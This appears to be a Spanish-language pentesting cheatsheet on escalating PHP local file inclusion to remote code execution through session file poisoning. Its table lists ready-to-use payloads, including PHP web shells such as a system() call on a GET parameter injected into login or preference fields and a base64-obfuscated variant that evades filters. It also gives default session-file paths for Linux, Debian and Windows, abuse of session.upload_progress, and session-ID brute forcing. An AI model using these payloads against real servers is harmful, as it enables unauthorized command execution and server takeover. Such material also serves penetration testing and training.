---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
---
# LFI To RCE - Session File Poisoning 

***

## Cheatsheet

| Técnica                                    | Descripción                                                                                     | Payload                                                                    |
| ------------------------------------------ | ----------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| <br>Session poisoning básico               | <br>Inyectar código PHP en un valor de sesión controlable y luego incluir el archivo de sesión  | <br>Input: `<?php system('id'); ?>` → LFI: `/tmp/sess_<PHPSESSID>`<br><br> |
| <br>Ruta por defecto Linux                 | <br>Incluir sesiones desde la ubicación estándar en Linux                                       | <br>LFI: `/tmp/sess_<PHPSESSID>`<br><br>                                   |
| <br>Ruta por defecto Debian/Ubuntu<br><br> | <br>Ubicación alternativa en distros Debian-based                                               | <br>LFI: `/var/lib/php/sessions/sess_<PHPSESSID>`<br><br>                  |
| <br>Ruta por defecto Windows<br><br>       | <br>Ubicación estándar de sesiones en Windows                                                   | <br>LFI: `C:\Windows\Temp\sess_<PHPSESSID>`<br><br>                        |
| <br>Ruta custom via phpinfo                | <br>Obtener `session.save_path` desde phpinfo() para encontrar la ruta exacta<br><br>           | <br>Leer phpinfo → usar ruta revelada<br><br>                              |
| <br>Poisoning via campo de login           | <br>Inyectar código en un campo de usuario/nombre que se guarde en sesión<br><br>               | <br>Username: `<?php system($_GET['cmd']); ?>`<br><br>                     |
| <br>Poisoning via preferencias<br><br>     | <br>Inyectar en campos de configuración del usuario (idioma, tema, etc.)                        | <br>Preference: `<?php system('id'); ?>`<br><br>                           |
| <br>Poisoning con base64 decode<br><br>    | <br>Evadir filtros encodeando el payload en la sesión                                           | <br>`<?php system(base64_decode('aWQ=')); ?>`<br><br>                      |
| <br>Session upload progress                | <br>Abusar de `session.upload_progress` para inyectar código en la sesión sin campo controlable | <br>POST con `PHP_SESSION_UPLOAD_PROGRESS` conteniendo payload PHP<br><br> |
| <br>Brute force de session ID              | <br>Si no conocés tu PHPSESSID, intentar predecir o forzar el ID                                | <br>Fuerza bruta sobre `/tmp/sess_XXXXX`<br><br>                           |


***

## Overview

PHP almacena los datos de sesión en archivos en el servidor, generalmente en `/tmp` o `/var/lib/php/sessions/`. Cuando la aplicación guarda input del usuario en la sesión (nombre de usuario, preferencias, etc.), el atacante puede inyectar código PHP en ese valor. Después, conociendo su propio `PHPSESSID` (visible en la cookie), construye la ruta al archivo de sesión y lo incluye con el LFI, ejecutando el código inyectado. La técnica de `session.upload_progress` es particularmente interesante porque permite envenenar la sesión incluso cuando no hay ningún campo de usuario que se almacene en ella, siempre que esa directiva esté habilitada en PHP.


***

